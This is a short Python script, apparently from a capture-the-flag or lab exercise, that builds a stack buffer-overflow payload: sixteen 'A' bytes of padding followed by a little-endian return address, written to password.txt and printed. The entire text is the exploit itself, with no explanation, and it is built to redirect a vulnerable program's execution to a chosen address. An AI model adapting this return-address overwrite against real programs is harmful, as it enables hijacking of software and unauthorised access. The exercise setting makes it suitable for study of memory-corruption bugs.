target_addr = 0x0040112f
addr_bytes = target_addr.to_bytes(4, byteorder='little')
payload = b'A' * 16 + addr_bytes
with open('password.txt', 'wb') as f:
    f.write(payload)
print("Payload: ", payload)